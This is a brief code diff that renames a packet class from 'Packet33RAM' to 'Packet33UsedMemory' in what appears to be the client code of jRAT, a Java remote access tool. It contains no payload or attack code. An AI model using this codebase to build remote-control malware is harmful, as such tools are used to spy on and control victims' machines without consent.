@@ -5,7 +5,7 @@ import java.io.DataOutputStream;
 import se.jrat.client.Slave;
 
 
-public class Packet33RAM extends AbstractOutgoingPacket {
+public class Packet33UsedMemory extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(Slave slave, DataOutputStream dos) throws Exception {
